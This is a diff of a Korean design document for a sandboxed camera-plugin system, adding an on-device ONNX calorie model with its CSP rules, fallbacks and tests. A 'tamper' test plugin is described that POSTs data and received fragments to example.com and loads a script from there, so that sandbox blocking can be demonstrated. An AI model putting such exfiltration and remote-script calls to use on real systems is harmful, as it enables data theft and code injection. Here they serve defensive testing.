@@ -38,7 +38,7 @@
 2. 1초 창 메시지 수 > 20이면 종료("한도 초과: 초당 메시지 20건").
 3. `event.ports`가 있으면 형식 오류.
 4. `parsePluginMessage(data)`(`host/validate.ts`, 순수 함수). **형식을 먼저, 한도를 나중에** 본다.
-   - 형식: 일반 객체가 아님, 문자열이 아닌 값(Blob 등), 모르는 `type`, 키가 정확히 그 type의 키가 아님(빠짐·남음), `ack.sha256`이 16진 64자(대소문자 무관)가 아님, `result.source`가 `api`·`fallback`이 아님, `violation.attempt`가 4종이 아님.
+   - 형식: 일반 객체가 아님, 문자열이 아닌 값(Blob 등), 모르는 `type`, 키가 정확히 그 type의 키가 아님(빠짐·남음), `ack.sha256`이 16진 64자(대소문자 무관)가 아님, `result.source`가 `on-device`·`api`·`fallback`이 아님, `violation.attempt`가 4종이 아님.
    - 한도: `JSON.stringify(data)`의 UTF-8 바이트 > 8KiB, `pluginId`·`deliveryId` > 128, `text` > 200, `target` > 512. 길이는 **UTF-16 길이**(`String.length`)로 센다. SDK도 `slice(0, 200)`·`slice(0, 512)`로 같은 기준에 맞춰 자른다(02-SSRD "플러그인 SDK", 2026-10-31 명세 정리).
 5. `ack`·`result`의 `deliveryId`가 그 runtime에 보낸 것이 아니면 형식 오류.
 6. 같은 runtime의 두 번째 `ready`, 같은 `deliveryId`의 두 번째 `ack`·`result`, 같은 `attempt`·`target`의 두 번째 `violation`은 조용히 버린다. 서로 다른 `violation`이 8건을 넘으면 종료("한도 초과: 위반 보고 8건"). 변조 플러그인은 4건이다. 자기 보고로 로그 100건을 밀어내 다른 플러그인의 전달·썸네일을 지우지 못하게 한다.
@@ -76,7 +76,7 @@
 
 - `onInit`·`onDelivery`는 마지막 등록이 이긴다. `init`은 처음 1번만. 핸들러 Promise가 2.5초 안에 끝나면 `ready`, 예외·시간 초과면 보내지 않는다. 핸들러가 없으면 바로 `ready`.
 - `ready` 전 `delivery`는 버린다. 메시지마다 따로 `해시 → ack → 핸들러`를 돌리고 핸들러를 기다려 다음 전달을 막지 않는다. Blob을 읽어 `crypto.subtle` → 실패하면 `sha256Pure`로 해시를 만들고(소문자 16진) **핸들러보다 먼저** `ack`. Blob 읽기·해시가 실패하면 ack도 핸들러 호출도 없다. 핸들러 예외는 삼킨다.
-- `result`: 받은 `deliveryId`에만, 1번만, `String(text).slice(0, 200)`, `source`는 `api`·`fallback`만. `reportViolation`: `attempt` 4종만, `String(target).slice(0, 512)`, 같은 `attempt + '\n' + 자른 target`은 1번. `ready` 전에도 보낼 수 있다.
+- `result`: 받은 `deliveryId`에만, 1번만, `String(text).slice(0, 200)`, `source`는 `on-device`·`api`·`fallback`만. `reportViolation`: `attempt` 4종만, `String(target).slice(0, 512)`, 같은 `attempt + '\n' + 자른 target`은 1번. `ready` 전에도 보낼 수 있다.
 - SDK는 시작할 때 `scope.postMessage`를 붙잡아 쓰고, `self.framelet`은 고칠 수 없는 속성(얼린 객체)이다. 플러그인이 같은 Worker에서 이것을 우회할 수 있다는 점은 02-SSRD "지킬 수 없는 것" 그대로다.
 - 시험용 옵션(`forcePureHash`, `testAckMode: 'corrupt'`(받은 바이트의 `byte[0] ^= 0xff` 뒤 해시) `| 'suppress'`(ack 없음))은 호스트 옵션 `sdkTestOptionsFor`로만 넣는다. 제품 코드에서 넣는 곳은 없고 `/dev` 시험 페이지만 쓴다. 플러그인은 원래 같은 Worker에서 무엇이든 할 수 있으므로 이 옵션이 새 권한을 주지 않는다.
 
@@ -109,9 +109,25 @@
 
 | 플러그인 | 하는 일 | 기록 |
 | --- | --- | --- |
-| 칼로리(`calorie.ts`) | `apiBase`가 null(비교 모드)이면 요청하지 않고 고정표. 아니면 `POST {apiBase}/api/calorie`, 본문 = 받은 Blob 그대로, `Content-Type: image/jpeg`, `x-label`은 core `X_LABEL_RE`(32자 이하)를 통과할 때만. 3초 타이머(`CALORIE_CLIENT_TIMEOUT_MS`)는 `fetch` 바로 전에 시작하고 같은 signal로 `res.text()`까지 덮는다. 200이고 첫 줄이 비어 있지 않으면 그 줄(`api`), 그 밖(비 200·빈 본문·중단·네트워크 오류·CSP 차단)은 고정표(`fallback`) | 남기지 않는다. 실패해도 `reportViolation`을 부르지 않는다(서버 장애가 HUD 빨강으로 보이지 않게, 02-SSRD "플러그인 SDK" 네트워크 행) |
+| 칼로리(`calorie.ts`) | `apiBase`가 null(비교 모드)이면 요청하지 않고 고정표. 아니면 먼저 기기 안 모델(2.10, `on-device`), 쓸 수 없으면 `POST {apiBase}/api/calorie`, 본문 = 받은 Blob 그대로, `Content-Type: image/jpeg`, `x-label`은 core `X_LABEL_RE`(32자 이하)를 통과할 때만. 3초 타이머(`CALORIE_CLIENT_TIMEOUT_MS`)는 `fetch` 바로 전에 시작하고 같은 signal로 `res.text()`까지 덮는다. 200이고 첫 줄이 비어 있지 않으면 그 줄(`api`), 그 밖(비 200·빈 본문·중단·네트워크 오류·CSP 차단)은 고정표(`fallback`) | 남기지 않는다. 실패해도 `reportViolation`을 부르지 않는다(서버 장애가 HUD 빨강으로 보이지 않게, 02-SSRD "플러그인 SDK" 네트워크 행) |
 | 고정표 | `src/core/calorie.ts`의 `CALORIE_TABLE`·`X_LABEL_RE`·`X_LABEL_MAX`를 registry가 JSON 인자로 넣는다. Worker 안 규칙은 core `fallbackText`와 같고, 표 밖 문구는 core가 정한 "음식(종류 미상)"(`fallbackText('')`로 받아 넣는다). check-plugins가 여러 라벨로 core와 대조한다 | — |
 | 변조(`tamper.ts`) | `onInit`이 끝난 뒤(ready 다음) 4종을 차례로: `navigator.mediaDevices.getUserMedia`, `document`·`parent`·`top`·`localStorage`를 이름 그대로 평가(CSP에 `unsafe-eval`이 없어 `new Function`은 쓰지 않는다), `fetch('https://example.com/framelet-tamper', POST)`, `importScripts('https://example.com/framelet-tamper.js')`. 받은 조각도 같은 주소로 보내 본다 | 4종 각각 `reportViolation`. target에 본 결과를 적는다(`→ 없음`, `=ReferenceError`). 시도가 성공하면 target에 "차단 실패!"를 붙인다. fetch·script target은 URL이라 호스트가 목록과 대조한다 |
+
+### 2.10 칼로리 기기 안 모델 (2026-11-01, 사용자 결정)
+
+calorie-lens(MIT, DINOv2-B 기반) ONNX를 칼로리 플러그인 격리 안에서 돌린다. 순서는 기기 안 모델 → `/api/calorie` → 고정표다. 계약은 02-SSRD IF-08 "기기 안 모델" 행이다.
+
+| 부분 | 결정 |
+| --- | --- |
+| 어디서 | 칼로리 Worker가 blob으로 만드는 **하위 Worker**(`calorie-model.ts`의 `calorieModelWorker`). 세션 만들기와 단일 스레드 WASM 실행은 그 스레드를 몇 초씩 잡을 수 있다. 같은 스레드에서 돌리면 그동안 SDK가 다음 전달의 ack를 못 보내 2초 `timeout`이 되고, 2.5초 제한도 실행이 끝나야 잴 수 있다. 하위 Worker는 iframe CSP를 그대로 물려받는다 |
+| 시작 | `onInit`에서 `apiBase`가 있고 `manifest.network`에 `$ORIGIN`이 있으면 기다리지 않고 띄운다(ready를 막지 않는다). 비교 모드·F14 매니페스트는 띄우지 않는다 |
+| 불러오기 | `<apiBase>/models/calorie-lens/model.json` → 조각을 받아 이어 붙임 → `importScripts(<apiBase>/ort/ort.(webgpu\|wasm).min.js)` → `wasmPaths`로 같은 `/ort/`의 glue `.mjs`·`.wasm` → 세션 → 0 입력으로 두 번 실행(첫 번째는 준비 비용, 두 번째가 제한 2.5초를 넘으면 `failed`, 출력이 숫자가 아니어도 `failed`) → `loaded`. `failed`면 칼로리 Worker가 이유를 `console.warn`(개발자 도구만)으로 남기고 끈다. `reportViolation`은 부르지 않는다 |
+| model.json | `files`(이어 붙이면 ONNX 하나, 이름은 한 단계, 8개까지), `input`(`name`, `width`·`height`, RGB `mean`·`std`(0~1 기준), `resize`: `stretch` 또는 `center-crop` + `cropFraction`), `output`(`name`, 평탄화 `index`). 출력은 전체 kcal이어야 한다(정규화를 되돌리는 계산은 ONNX 안에 넣는다). `parseModelSpec`이 검사한다 |
+| 전달 | 준비 전·실행 중이면 바로 API. 아니면 Blob을 하위 Worker로 보내 `createImageBitmap` → `OffscreenCanvas` 자르기·줄이기(`imageSmoothingQuality: high`) → NCHW float32 → 실행. 핸들러에 들어온 때부터 2.5초(`ON_DEVICE_TIMEOUT_MS`)를 넘으면 API로 가고, 늦은 답은 실행 중 표시만 푼다. 연달아 2번 넘거나 한 실행이 5초를 넘게 안 끝나면 그 iframe에서 끈다. 값이 5~5000 밖이거나 유한하지 않으면 API(단위·정규화가 어긋난 모델이 그럴듯한 틀린 숫자를 내지 않게), 아니면 반올림해 10~3000. 최악의 결과 시간은 2.5초 + API 3초 |
+| 결과 | `${ko} 약 ${kcal}kcal`(이름은 0단계 라벨의 고정표 이름, 표 밖은 `음식`), `source: 'on-device'`. `apiSends`는 `source: 'api'` 결과 수 그대로라 기기 안 결과는 세지 않는다(요청이 없다) |
+| CSP | 호스트가 칼로리 iframe에만 `buildCsp(nonce, connectList, hostOrigin)`을 부른다. `connectList`에 그 origin이 있을 때만 `script-src`에 `'wasm-unsafe-eval' <origin>/ort/`가 붙는다. 경로까지만 열어 호스트의 다른 JS는 실행할 수 없다. `/ort/`에는 고정한 패키지 파일만 둔다 |
+| 파일 | onnxruntime-web 1.30.0(정확히 고정)의 `dist`에서 6개를 `vite.config.ts`가 `/ort/`로 내보낸다(개발 서버는 `node_modules`에서 바로, 빌드는 `dist/ort/`). 레포에 바이너리를 다시 넣지 않아 판이 패키지와 어긋나지 않는다. CORS는 `vercel.json`과 개발 서버가 `/models/*`·`/ort/*`(개발 서버는 `/dev/fixtures/*`도)에 붙인다 |
+| 자리표시 | `dev/fixtures/calorie-lens-placeholder/`(`scripts/make-placeholder-model.ts`가 protobuf를 직접 쓴다. kcal = 300 + 100·평균, 조각 2개). 제품 경로 `/models/calorie-lens/`에는 넣지 않아, 실제 모델이 오기 전 배포는 지금처럼 API로 간다 |
 
 ## 3. 고르지 않은 방법
 
@@ -124,6 +140,10 @@
 | 형식 오류마다 바로 종료 | 시연 중 사소한 실수로 칼로리 플러그인이 꺼진다. 3번째에 종료한다 |
 | `fireImmediately` 구독 | 2.4 첫 문단(재활성화가 안 불리는 문제) |
 | `/dev`를 `App.tsx` 라우트로 | C 소유 파일이고 프로덕션 번들에 시험 코드가 섞인다 |
+| 기기 안 모델을 칼로리 Worker 스레드에서 바로 | 2.10 "어디서". ort 프록시 모드(`env.wasm.proxy`)도 하위 Worker를 쓰지만 WebGPU와 함께 쓸 수 없고 시간 초과를 우리가 다루기 어렵다 |
+| ort ESM 번들(`*.bundle.min.mjs`)을 Worker 소스에 넣기 | glue까지 들어 있어 `script-src`에 origin을 더하지 않아도 되지만, 모듈 Worker로 바꾸고 `export`를 고쳐 써야 한다. 고전 Worker + `importScripts`가 지금 부트스트랩을 그대로 쓴다 |
+| `public/ort/`에 wasm 복사본 커밋 | 41MB가 레포에 늘고 패키지 판과 어긋날 수 있다. 빌드가 고정한 패키지에서 내보낸다 |
+| 자리표시 모델을 `public/models/calorie-lens/`에 | 실제 모델 전까지 배포가 의미 없는 숫자를 `on-device`로 낸다 |
 
 ## 4. 남은 위험
 
@@ -133,11 +153,18 @@
 - **CSP 차단은 네트워크 탭에 줄이 생기지 않는다.** Chrome 156 CDP 기록에서 Worker의 CSP 차단 fetch·importScripts는 요청 이벤트 자체가 없었다(`(blocked:csp)` 줄 없음). 그래서 데모 증거는 "example.com으로 간 요청 0건"이다. Vite 개발 서버에는 `/api/calorie`가 없어서 Origin null 사전 요청이 Vite CORS에서 막힌다(고정표 + "허용 목록 안인데 실패"). 서버 함수는 다음 PR이다.
 - **Worker CSP 상속.** blob Worker가 iframe CSP를 상속한다는 것은 Chrome(팀원 v2)과 iPhone Safari(S1~S4) 재현 페이지에서만 봤다. Android Chrome은 V9, 통합 앱은 V11에서 본다.
 - **늦은 `ack`.** 옛 iframe을 없애면 그 iframe에 보낸 전달은 2초 뒤 `timeout`이 된다. 02-SSRD IF-04대로 "수신 미확인"이 맞다.
+- **Chrome 격리 Worker에는 WebGPU가 없다.** Chrome 152에서 origin `null` sandbox iframe의 blob Worker는 `isSecureContext === false`이고 `navigator.gpu`·`crypto.subtle`이 없었다(같은 페이지는 WebGPU 어댑터가 있음). 그래서 Chrome에서는 항상 단일 스레드 WASM이다. DINOv2-B int8이 2.5초 안에 끝나는지는 실제 모델로 재야 한다. 넘으면 API로 가므로 결과는 나오지만 기기 안 이점이 없다.
+- **내장 브라우저의 로컬 네트워크 차단.** Claude 내장 브라우저(Chrome 152)에서는 sandbox Worker가 `localhost`·`127.0.0.1`로 보내는 요청이 모두 `Failed to fetch`였다(이 변경 전부터 있던 `/api/calorie`도 같음). headless Chrome 156에서는 됐다. 공개 HTTPS 배포 주소에서는 해당하지 않을 것으로 보지만 확인하지 못했다(V11).
+- **큰 모델과 메모리.** 조각 배열·이어 붙인 버퍼·WASM 힙의 모델 사본·ort 초기값이 잠깐 함께 있어 모델 크기의 3~4배쯤을 쓴다. 휴대폰에서 탭이 다시 로드되면 처음부터 다시 받는다. int8 90MB 안팎이 목표이고, 실제 모델로 V9·V11에서 본다.
+- **iframe을 다시 만들 때마다 다시 받는다.** 매니페스트 적용·비교 모드·켜고 끄기마다 칼로리 iframe이 새로 생기고 모델을 다시 받아 세션을 만든다. 그동안 전달은 API로 간다. origin `null` iframe에는 IndexedDB·Cache Storage가 없고, HTTP 캐시가 맞는지는 확인하지 못했다(V11).
+- **결과 순서.** 전달 간격이 2초(`maxPerMinute` 30)면 앞 전달의 API 결과가 뒤 전달의 기기 안 결과보다 늦게 와서 결과 줄을 덮을 수 있다. API만 쓰던 때도 같았다.
+- **휴대폰 미확인.** 하위 Worker(`new Worker(blob)` 안의 `new Worker(blob)`), 하위 Worker의 CSP 상속, `'wasm-unsafe-eval'`, Worker 안 `OffscreenCanvas` 2d를 iPhone Safari·Android Chrome에서 보지 못했다. 안 되면 결과는 API로 나오고 신호는 개발자 도구 경고뿐이다. V9·V11 점검 항목에 넣는다.
+- **CPU 경쟁.** 기기 안 실행이 A의 카메라·MediaPipe 처리와 같은 CPU를 쓴다. 처리량에 주는 영향은 재지 않았다.
 
 ## 5. 확인 방법
 
-- `npm run check:plugins`(`scripts/check-plugins.ts`) 34개: `sha256Pure` 표준 벡터·무작위 길이·600KB·M0 JPEG, 메시지 검증기 경계(200/201자, UTF-16 이모지, 128·512자, 크기, 모르는 키, Blob 값, 빈 프로토타입), CSP 생성과 주입 거부, srcdoc 순서, violation reason 대조, 칼로리(가짜 fetch: 200·비 200·요청 실패·시간 초과·apiBase null·헤더 규칙·core `fallbackText`와 같은 문구), 변조 4종, SDK를 원본·축소판으로 `vm`에서 돌려 ready·ack·result·violation·순수 JS·corrupt·suppress·해시 실패·느린 핸들러와 다음 ack·onInit 예외·hello 결과 줄.
-- 개발 서버 `/dev/m0.html` M0 페이지 15줄, `/dev/plugins.html` 9줄(칼로리 정상·도메인 삭제·고정표 밖 라벨·비교 모드 켜기/끄기·변조 4종·변조 조각 외부 전송·apiSends).
+- `npm run check:plugins`(`scripts/check-plugins.ts`) 51개(기기 안 17개 포함): `sha256Pure` 표준 벡터·무작위 길이·600KB·M0 JPEG, 메시지 검증기 경계(200/201자, UTF-16 이모지, 128·512자, 크기, 모르는 키, Blob 값, 빈 프로토타입), CSP 생성과 주입 거부, srcdoc 순서, violation reason 대조, 칼로리(가짜 fetch: 200·비 200·요청 실패·시간 초과·apiBase null·헤더 규칙·core `fallbackText`와 같은 문구), 변조 4종, SDK를 원본·축소판으로 `vm`에서 돌려 ready·ack·result·violation·순수 JS·corrupt·suppress·해시 실패·느린 핸들러와 다음 ack·onInit 예외·hello 결과 줄. 기기 안: wasm CSP 조건, `model.json` 검사, NCHW 변환, 칼로리 순서(준비 전·실행 중·시간 초과·2번 초과·failed·잘못된 값·비교 모드·F14), 하위 Worker(가짜 ort로 판 고르기·단일 스레드·조각 잇기·가운데 자르기·출력 index·WebGPU 실패 시 wasm), 자리표시 모델을 실제 onnxruntime-web(Node)으로, 축소판.
+- 개발 서버 `/dev/m0.html` M0 페이지 15줄, `/dev/plugins.html` 9줄(칼로리 정상·도메인 삭제·고정표 밖 라벨·비교 모드 켜기/끄기·변조 4종·변조 조각 외부 전송·apiSends), `/dev/on-device.html` 6줄(CSP, 첫 on-device, 5회 시간, 모델 없음, 비교 모드, 단계별 시간. `?model=/models/calorie-lens/`로 실제 모델).
 
 ## 6. 리뷰 기록
 
